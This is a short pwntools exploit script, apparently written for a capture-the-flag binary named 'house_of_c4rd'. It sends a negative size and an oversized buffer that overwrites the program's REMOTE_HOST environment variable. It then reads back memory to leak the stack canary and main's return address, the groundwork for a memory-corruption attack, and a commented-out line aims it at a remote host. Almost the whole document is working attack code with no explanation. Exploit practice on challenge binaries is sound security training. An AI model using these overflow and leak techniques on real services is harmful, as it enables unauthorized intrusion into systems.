#!/usr/bin/env python
from pwn import *

while True:
    p = process('./house_of_c4rd', env={'REMOTE_HOST': '44.33.22.11'})
# p = remote('192.168.85.128', 9999)

# gdb.attacg(p, '''b*0x555555555e6a
# set env REMOTE_HOST=127.0.0.1
# handle SIGALRM ignore
# c
# ''')
    # context.log_level = 'debug'

    def write(fn):
        p.sendlineafter(b'> ', b'1')
        p.sendlineafter(b': ', fn)
    def read(fn):
        global path
        p.sendlineafter(b'> ', b'2')
        p.sendlineafter(b': ', fn)
        path = p.recvuntil(b'\n')
        print(path)
    def goWrite(size, data, key):
        p.sendlineafter(b'> ', b'3')
        p.sendlineafter(b'> ', size)
        p.sendlineafter(b'> ', data)
        p.sendlineafter(b'> ', key)
    def goRead(key):
        p.sendlineafter(b'> ', b'3')
        p.sendlineafter(b'> ', key)

    # idea: overwrite REMOTE_HOST in enviroment var
    write(b'leak')
    # gdb
    # goWrite(b'-1', b'a'*0x758 + b'REMOTE_HOST=(null)\0\0\0\0\0', b'yek')
    goWrite(b'-1', b'a'*(0x758) + b'//////////////(null)\0'*0x100, b'yek')
    read(b'aaaa')
    if b'/(null)' in path:
        goRead(b'yek')

        leak = p.recvuntil(b'our services :)\n')
        leak_canary = u64(leak[0x420:0x420+8])
        log.info('Canary: ' + hex(leak_canary)[2:])
        leak_main_ret = u64(leak[0x420+16:0x420+24])
        log.info('Main_Ret: ' + hex(leak_main_ret)[2:])
        break
    else: p.close()
